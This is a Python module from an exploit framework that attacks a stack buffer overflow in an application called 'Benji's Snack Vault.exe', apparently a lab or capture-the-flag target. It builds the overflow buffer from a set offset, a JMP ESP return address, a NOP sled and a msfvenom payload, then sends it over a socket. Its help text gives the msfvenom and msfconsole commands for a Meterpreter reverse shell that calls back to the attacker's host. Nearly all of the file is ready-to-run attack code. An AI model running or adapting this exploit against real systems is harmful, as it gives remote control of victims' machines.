# modules/buffer_overflow/benjis_snack_vault_bo.py

import socket
import struct
from base_module import BaseModule
from utils import colored

class BenjisSnackVaultBO(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "benjis_snack_vault_bo"
        self.description = "Exploit stack buffer overflow in Benji's Snack Vault.exe for Meterpreter shell"

        self.options = {
            "RHOST": {"value": "192.168.107.132", "required": True, "description": "Target IP"},
            "RPORT": {"value": 9999, "required": True, "description": "Target port"},
            "LHOST": {"value": "", "required": True, "description": "Your IP (for reverse shell)"},
            "LPORT": {"value": 4444, "required": True, "description": "Listener port"},
            "PREFIX": {"value": "MEOW ", "required": True, "description": "Input prefix"},
            "OFFSET": {"value": 1731, "required": True, "description": "Bytes to EIP"},
            "RET": {"value": "0x114015f3", "required": True, "description": "JMP ESP address (hex)"},
            "BADCHARS": {"value": "\\x00\\x09\\x0a\\x0d", "required": True, "description": "Bad chars (msfvenom format)"},
            "NOP_SLED": {"value": 100, "required": False, "description": "NOP sled size"},
            "PAYLOAD_FILE": {"value": "meterpreter.bin", "required": True, "description": "Path to msfvenom raw payload"}
        }

    def show_help(self):
        print(colored("\nExploit Help:", "yellow"))
        print("1. Generate payload first:")
        print("   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -b \"<BADCHARS>\" -f raw -o <PAYLOAD_FILE>")
        print("2. Start handler:")
        print("   msfconsole -q -x \"use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; run\"")
        print("3. set options → run\n")

    def run(self):
        opts = {k: v["value"] for k, v in self.options.items()}
        rhost = opts["RHOST"]
        rport = int(opts["RPORT"])
        prefix = opts["PREFIX"]
        offset = int(opts["OFFSET"])
        ret_hex = opts["RET"]
        nop_count = int(opts["NOP_SLED"])
        payload_file = opts["PAYLOAD_FILE"]

        try:
            ret_addr = int(ret_hex, 16)
            ret = struct.pack("<I", ret_addr)
        except ValueError:
            print(colored("[-] Invalid RET format (use e.g. 0x114015f3)", "red"))
            return

        try:
            with open(payload_file, "rb") as f:
                payload = f.read()
            print(colored(f"[+] Loaded {len(payload)} bytes from {payload_file}", "green"))
        except FileNotFoundError:
            print(colored(f"[-] Payload file not found: {payload_file}", "red"))
            return

        junk = b"A" * offset
        nops = b"\x90" * nop_count
        buffer = prefix.encode() + junk + ret + nops + payload + b"\r\n"

        print(colored(f"[*] Sending exploit ({len(buffer)} bytes) to {rhost}:{rport}...", "yellow"))

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((rhost, rport))
            s.send(buffer)
            s.close()
            print(colored("[+] Exploit sent!", "green"))
            print(colored("    Check Metasploit handler for session.", "yellow"))
        except Exception as e:
            print(colored(f"[-] Error: {e}", "red"))